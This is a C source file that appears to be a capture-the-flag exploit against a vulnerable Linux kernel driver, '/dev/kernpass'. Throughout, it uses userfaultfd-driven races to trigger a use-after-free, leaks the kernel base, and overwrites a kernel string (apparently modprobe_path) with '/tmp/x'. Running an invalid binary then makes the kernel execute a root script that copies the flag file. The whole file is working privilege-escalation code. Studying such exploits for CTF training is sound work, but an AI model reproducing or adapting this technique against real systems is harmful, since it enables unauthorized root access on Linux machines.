#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/ipc.h>

#define ADD_PW 0x13370001 
#define CHK_PW 0x13370002
#define EDIT_PW 0x13370003
#define DEL_PW 0x13370004

cpu_set_t pwn_cpu;
int fd;
unsigned long kheap;
unsigned long kbase;

void *page;
char *buf;
int uffd_stage = 0;
int spray[0x50];

typedef struct {
  unsigned int index;
  unsigned int size;
  char *password;
} request_t;

typedef struct {
  unsigned int size;
  char *password;
} password_entity;

typedef struct {
  password_entity *passwords[0x20];
} password_list;


int add_password(unsigned int index, unsigned int size, char *pw){
    //printf("ADD\n");
    request_t req;
    memset(&req, '\0', sizeof(request_t));
    req.index = index;
    req.size = size;
    req.password = pw;
    int ret = ioctl(fd, ADD_PW, &req);
    if (ret < 0) die("Add");
    //printf("Created #%d\n", ret);
    return ret;
}

int check_password(unsigned int index, char *pw){
    //printf("ADD\n");
    request_t req;
    memset(&req, '\0', sizeof(request_t));
    req.index = index;
    req.size = 0;
    req.password = pw;
    int ret = ioctl(fd, CHK_PW, &req);
    if (ret < 0) die("check password");
    //printf("Created #%d\n", ret);
    return ret;
}

int edit_password(unsigned int index, char *pw){
    //printf("ADD\n");
    request_t req;
    memset(&req, '\0', sizeof(request_t));
    req.index = index;
    req.size = 0;
    req.password = pw;
    int ret = ioctl(fd, EDIT_PW, &req);
    if (ret < 0) die("EDIT");
    //printf("Created #%d\n", ret);
    return ret;
}

int delete_password(unsigned int index){
    //printf("ADD\n");
    request_t req;
    memset(&req, '\0', sizeof(request_t));
    req.index = index;
    req.size = 0;
    req.password = 0;
    int ret = ioctl(fd, DEL_PW, &req);
    if (ret < 0) die("RESET");
    //printf("Created #%d\n", ret);
    return ret;
}

int die(char *text){                
    printf("Die: %s\n", text);
    exit(-1);
} 

int hexdump(char *target, int size){                
    for (int i=0; i<size/8; i++){                 
      if (*(unsigned long*)(target+(i*8)) != 0){
        printf("0x%x: 0x%lx\n", i*8, *(unsigned long*)(target+(i*8)));    
      }                              
    }                                                                                                
}

int uffd_stage1(){
  puts("[+] UAF read");
  delete_password(0);   

  for (int i=0; i < 0x50; i++){
    seq_open();
  }

}

int uffd_stage2(){

  puts("[+] UAF write");

  delete_password(0);   

  add_password(2, 0x20, buf);  
  add_password(3, 0x20, buf);  
}

static void* fault_handler_thread(void *arg) {
  char *dummy_page;
  static struct uffd_msg msg;
  struct uffdio_copy copy;
  struct pollfd pollfd;
  long uffd;
  static int fault_cnt = 0;

  uffd = (long)arg;

  dummy_page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (dummy_page == MAP_FAILED) die("mmap(dummy)");

  puts("[+] fault_handler_thread: waiting for page fault...");
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  while (poll(&pollfd, 1, -1) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      die("poll");

    /* ページフォルト待機 */
    if (read(uffd, &msg, sizeof(msg)) <= 0) die("read(uffd)");
    assert (msg.event == UFFD_EVENT_PAGEFAULT);

    printf("[+] uffd: flag=0x%llx\n", msg.arg.pagefault.flags);
    printf("[+] uffd: addr=0x%llx\n", msg.arg.pagefault.address);
    if (uffd_stage == 0){
      uffd_stage1();
    } else if (uffd_stage == 1){
      uffd_stage2();
    }
    uffd_stage++;
    //----------------------------------------------

    copy.src = (unsigned long)buf;
    copy.dst = (unsigned long)msg.arg.pagefault.address;
    copy.len = 0x1000;
    copy.mode = 0;
    copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &copy) == -1) die("ioctl(UFFDIO_COPY)");
  }

  return NULL;
}

int register_uffd(void *addr, size_t len) {
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  long uffd;
  pthread_t th;

  /* userfaultfdの作成 */
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (uffd == -1) die("userfaultfd");

  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    die("ioctl(UFFDIO_API)");

  /* ページをuserfaultfdに登録 */
  uffdio_register.range.start = (unsigned long)addr;
  uffdio_register.range.len = len;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    die("UFFDIO_REGISTER");

  /* ページフォルトを処理するスレッドを作成 */
  if (pthread_create(&th, NULL, fault_handler_thread, (void*)uffd))
    die("pthread_create");

  return 0;
}


int seq_open()
{
	int seq;
	if ((seq=open("/proc/self/stat", O_RDONLY))==-1)
	{
		puts("[X] Seq Open Error");
		exit(0);
	}
	return seq;
}

int main(){

    system("echo -ne '#!/bin/sh\n/bin/cp /root/flag.txt /tmp/flag.txt\n/bin/chmod 777 /tmp/flag.txt' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/crash");
    system("chmod +x /tmp/crash");

    char *master_pw;
    buf = malloc(0x3000);

    CPU_ZERO(&pwn_cpu);
    CPU_SET(0, &pwn_cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
      die("sched_setaffinity");
  
    //open device
    fd = open("/dev/kernpass", O_RDWR);
    if (fd == -1) die("Open device failed");
   
    // Prepare uffd
    page = mmap(NULL, 0x3000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); 
    register_uffd(page, 0x3000);

    // Leak kbase
    memset(buf, 'A', 0x20);
    add_password(0, 0x20, buf);  

    check_password(0, page);
    hexdump(page, 0x100);
    kbase = *(unsigned long*)(page+0x8) - 0x4148d0;
    printf("[+] kbase: 0x%llx\n", kbase);

    // Overlap chunk
    memset(buf, 'A', 0x10);
    add_password(0, 0x10, buf);
    // setup fake entity  
    *(unsigned long*)(buf) = 0x8;
    *(unsigned long*)(buf+0x8) = kbase + 0x1a8be80;
    // trigger UAF
    edit_password(0, page+0x2000);

    edit_password(3, "/tmp/x");
    
    system("/tmp/crash");
    system("cat /tmp/flag.txt");

    
    return 0;
}